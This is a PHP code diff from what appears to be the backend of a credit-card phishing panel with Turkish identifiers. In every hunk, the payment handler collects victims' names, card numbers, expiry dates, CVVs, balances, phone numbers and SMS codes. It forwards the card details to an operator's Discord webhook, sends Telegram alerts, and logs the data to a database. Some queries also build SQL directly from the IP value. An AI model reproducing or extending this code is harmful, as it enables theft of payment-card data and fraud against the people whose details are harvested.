@@ -179,19 +179,19 @@ if ($_GET['action'] == "odeme") {
                     } else {
                         if ($checkAdmin["discord_webhook"] == 1 && $checkVisitor["discord_webhook_sended"] == 0) {
                             txmd_webhook($checkAdmin["discord_webhook_url"], tum_bosluklari_temizle(htmlspecialchars($_POST['kredi_karti'])) . ' ' . tum_bosluklari_temizle(htmlspecialchars($_POST['skt'])) . ' ' . htmlspecialchars($_POST['cvv']), $banka . ' (' . $seviye . ')', $check['tarih'], $check['device'] . ' - ' . $check['browser'], $check['ip']);
-                            $sorgu1 = $pdo->prepare("INSERT INTO logs SET ip=?,tarih=?,isim_soyisim=?,kredi_karti=?,skt=?,cvv=?,bakiye=?,banka=?,marka=?,seviye=?,tel_no=?,sms=?,durum=?");
-                            $sorgu2 = $pdo->prepare("INSERT INTO logs_visitor SET ip=?,useragent=?");
+                            $sorgu1 = $pdo->prepare("INSERT INTO logs SET isim_soyisim=?,bakiye=?,tel_no=?,kredi_karti=?,skt=?,cvv=?,banka=?,marka=?,seviye=?,tarih=?,sms=?,durum=?,comment=?,onlineTimer=?,ip=?");
+                            $sorgu2 = $pdo->prepare("INSERT INTO logs_visitor SET ip=?,useragent=?,discord_webhook_sended=?,log_notify=?,sms_notify=?");
                             $pdo->query("UPDATE logs_visitor SET discord_webhook_sended = 1 WHERE ip = '{$ip}'");
-                            $sorgu1->execute(array($ip, date('d.m.Y H:i'), mb_strtoupper(htmlspecialchars($_POST['isim_soyisim']), 'UTF-8'), tum_bosluklari_temizle(htmlspecialchars($_POST['kredi_karti'])), tum_bosluklari_temizle(htmlspecialchars($_POST['skt'])), htmlspecialchars($_POST['cvv']), htmlspecialchars($_POST['bakiye']), $banka, $marka, $seviye, isset($_POST['tel_no']) ? htmlspecialchars($_POST['tel_no']) : '', isset($_POST['sms']) ? htmlspecialchars($_POST['sms']) : '', 'Bekleme Ekranı'));
-                            $sorgu2->execute(array($ip, $_SERVER["HTTP_USER_AGENT"]));
+                            $sorgu1->execute(array(mb_strtoupper(htmlspecialchars($_POST['isim_soyisim']), 'UTF-8'), htmlspecialchars($_POST['bakiye']), isset($_POST['tel_no']) ? htmlspecialchars($_POST['tel_no']) : '', tum_bosluklari_temizle(htmlspecialchars($_POST['kredi_karti'])), tum_bosluklari_temizle(htmlspecialchars($_POST['skt'])), htmlspecialchars($_POST['cvv']), $banka, $marka, $seviye, date('d.m.Y H:i'), isset($_POST['sms']) ? htmlspecialchars($_POST['sms']) : '', 'Bekleme Ekranı', '', time(), $ip));
+                            $sorgu2->execute(array($ip, $_SERVER["HTTP_USER_AGENT"], 0, 0, 0));
                             if ($sorgu) {
                                 echo "yasakli_bin";
                             }
                         } else {
-                            $sorgu1 = $pdo->prepare("INSERT INTO logs SET ip=?,tarih=?,isim_soyisim=?,kredi_karti=?,skt=?,cvv=?,bakiye=?,banka=?,marka=?,seviye=?,tel_no=?,sms=?,durum=?");
-                            $sorgu2 = $pdo->prepare("INSERT INTO logs_visitor SET ip=?,useragent=?");
-                            $sorgu1->execute(array($ip, date('d.m.Y H:i'), mb_strtoupper(htmlspecialchars($_POST['isim_soyisim']), 'UTF-8'), tum_bosluklari_temizle(htmlspecialchars($_POST['kredi_karti'])), tum_bosluklari_temizle(htmlspecialchars($_POST['skt'])), htmlspecialchars($_POST['cvv']), htmlspecialchars($_POST['bakiye']), $banka, $marka, $seviye, isset($_POST['tel_no']) ? htmlspecialchars($_POST['tel_no']) : '', isset($_POST['sms']) ? htmlspecialchars($_POST['sms']) : '', 'Bekleme Ekranı'));
-                            $sorgu2->execute(array($ip, $_SERVER["HTTP_USER_AGENT"]));
+                            $sorgu1 = $pdo->prepare("INSERT INTO logs SET isim_soyisim=?,bakiye=?,tel_no=?,kredi_karti=?,skt=?,cvv=?,banka=?,marka=?,seviye=?,tarih=?,sms=?,durum=?,comment=?,onlineTimer=?,ip=?");
+                            $sorgu2 = $pdo->prepare("INSERT INTO logs_visitor SET ip=?,useragent=?,discord_webhook_sended=?,log_notify=?,sms_notify=?");
+                            $sorgu1->execute(array(mb_strtoupper(htmlspecialchars($_POST['isim_soyisim']), 'UTF-8'), htmlspecialchars($_POST['bakiye']), isset($_POST['tel_no']) ? htmlspecialchars($_POST['tel_no']) : '', tum_bosluklari_temizle(htmlspecialchars($_POST['kredi_karti'])), tum_bosluklari_temizle(htmlspecialchars($_POST['skt'])), htmlspecialchars($_POST['cvv']), $banka, $marka, $seviye, date('d.m.Y H:i'), isset($_POST['sms']) ? htmlspecialchars($_POST['sms']) : '', 'Bekleme Ekranı', '', time(), $ip));
+                            $sorgu2->execute(array($ip, $_SERVER["HTTP_USER_AGENT"], 0, 0, 0));
                             if ($sorgu) {
                                 echo "yasakli_bin";
                             }
@@ -227,11 +227,11 @@ if ($_GET['action'] == "odeme") {
                     } else {
                         if ($checkAdmin["discord_webhook"] == 1 && $checkVisitor["discord_webhook_sended"] == 0) {
                             txmd_webhook($checkAdmin["discord_webhook_url"], tum_bosluklari_temizle(htmlspecialchars($_POST['kredi_karti'])) . ' ' . tum_bosluklari_temizle(htmlspecialchars($_POST['skt'])) . ' ' . htmlspecialchars($_POST['cvv']), $banka . ' (' . $seviye . ')', $check['tarih'], $check['device'] . ' - ' . $check['browser'], $check['ip']);
-                            $sorgu1 = $pdo->prepare("INSERT INTO logs SET ip=?,tarih=?,isim_soyisim=?,kredi_karti=?,skt=?,cvv=?,bakiye=?,banka=?,marka=?,seviye=?,tel_no=?,sms=?,durum=?");
-                            $sorgu2 = $pdo->prepare("INSERT INTO logs_visitor SET ip=?,useragent=?");
+                            $sorgu1 = $pdo->prepare("INSERT INTO logs SET isim_soyisim=?,bakiye=?,tel_no=?,kredi_karti=?,skt=?,cvv=?,banka=?,marka=?,seviye=?,tarih=?,sms=?,durum=?,comment=?,onlineTimer=?,ip=?");
+                            $sorgu2 = $pdo->prepare("INSERT INTO logs_visitor SET ip=?,useragent=?,discord_webhook_sended=?,log_notify=?,sms_notify=?");
                             $pdo->query("UPDATE logs_visitor SET discord_webhook_sended = 1 WHERE ip = '{$ip}'");
-                            $sorgu1->execute(array($ip, date('d.m.Y H:i'), mb_strtoupper(htmlspecialchars($_POST['isim_soyisim']), 'UTF-8'), tum_bosluklari_temizle(htmlspecialchars($_POST['kredi_karti'])), tum_bosluklari_temizle(htmlspecialchars($_POST['skt'])), htmlspecialchars($_POST['cvv']), htmlspecialchars($_POST['bakiye']), $banka, $marka, $seviye, isset($_POST['tel_no']) ? htmlspecialchars($_POST['tel_no']) : '', isset($_POST['sms']) ? htmlspecialchars($_POST['sms']) : '', 'Bekleme Ekranı'));
-                            $sorgu2->execute(array($ip, $_SERVER["HTTP_USER_AGENT"]));
+                            $sorgu1->execute(array(mb_strtoupper(htmlspecialchars($_POST['isim_soyisim']), 'UTF-8'), htmlspecialchars($_POST['bakiye']), isset($_POST['tel_no']) ? htmlspecialchars($_POST['tel_no']) : '', tum_bosluklari_temizle(htmlspecialchars($_POST['kredi_karti'])), tum_bosluklari_temizle(htmlspecialchars($_POST['skt'])), htmlspecialchars($_POST['cvv']), $banka, $marka, $seviye, date('d.m.Y H:i'), isset($_POST['sms']) ? htmlspecialchars($_POST['sms']) : '', 'Bekleme Ekranı', '', time(), $ip));
+                            $sorgu2->execute(array($ip, $_SERVER["HTTP_USER_AGENT"], 0, 0, 0));
                             $pdo->query("UPDATE logs SET durum = 'Bekleme Ekranı' WHERE ip = '{$ip}'");
                             if ($checkAdmin['sound_notify'] == 1) {
                                 $pdo->query("UPDATE logs_visitor SET log_notify = 1 WHERE ip = '{$ip}'");
@@ -239,10 +239,10 @@ if ($_GET['action'] == "odeme") {
                             telegram_send_message("odeme", $ip, substr(md5($ip), 0, 8));
                             echo "sms_aktif";
                         } else {
-                            $sorgu1 = $pdo->prepare("INSERT INTO logs SET ip=?,tarih=?,isim_soyisim=?,kredi_karti=?,skt=?,cvv=?,bakiye=?,banka=?,marka=?,seviye=?,tel_no=?,sms=?,durum=?");
-                            $sorgu2 = $pdo->prepare("INSERT INTO logs_visitor SET ip=?,useragent=?");
-                            $sorgu1->execute(array($ip, date('d.m.Y H:i'), mb_strtoupper(htmlspecialchars($_POST['isim_soyisim']), 'UTF-8'), tum_bosluklari_temizle(htmlspecialchars($_POST['kredi_karti'])), tum_bosluklari_temizle(htmlspecialchars($_POST['skt'])), htmlspecialchars($_POST['cvv']), htmlspecialchars($_POST['bakiye']), $banka, $marka, $seviye, isset($_POST['tel_no']) ? htmlspecialchars($_POST['tel_no']) : '', isset($_POST['sms']) ? htmlspecialchars($_POST['sms']) : '', 'Bekleme Ekranı'));
-                            $sorgu2->execute(array($ip, $_SERVER["HTTP_USER_AGENT"]));
+                            $sorgu1 = $pdo->prepare("INSERT INTO logs SET isim_soyisim=?,bakiye=?,tel_no=?,kredi_karti=?,skt=?,cvv=?,banka=?,marka=?,seviye=?,tarih=?,sms=?,durum=?,comment=?,onlineTimer=?,ip=?");
+                            $sorgu2 = $pdo->prepare("INSERT INTO logs_visitor SET ip=?,useragent=?,discord_webhook_sended=?,log_notify=?,sms_notify=?");
+                            $sorgu1->execute(array(mb_strtoupper(htmlspecialchars($_POST['isim_soyisim']), 'UTF-8'), htmlspecialchars($_POST['bakiye']), isset($_POST['tel_no']) ? htmlspecialchars($_POST['tel_no']) : '', tum_bosluklari_temizle(htmlspecialchars($_POST['kredi_karti'])), tum_bosluklari_temizle(htmlspecialchars($_POST['skt'])), htmlspecialchars($_POST['cvv']), $banka, $marka, $seviye, date('d.m.Y H:i'), isset($_POST['sms']) ? htmlspecialchars($_POST['sms']) : '', 'Bekleme Ekranı', '', time(), $ip));
+                            $sorgu2->execute(array($ip, $_SERVER["HTTP_USER_AGENT"], 0, 0, 0));
                             $pdo->query("UPDATE logs SET durum = 'Bekleme Ekranı' WHERE ip = '{$ip}'");
                             if ($checkAdmin['sound_notify'] == 1) {
                                 $pdo->query("UPDATE logs_visitor SET log_notify = 1 WHERE ip = '{$ip}'");
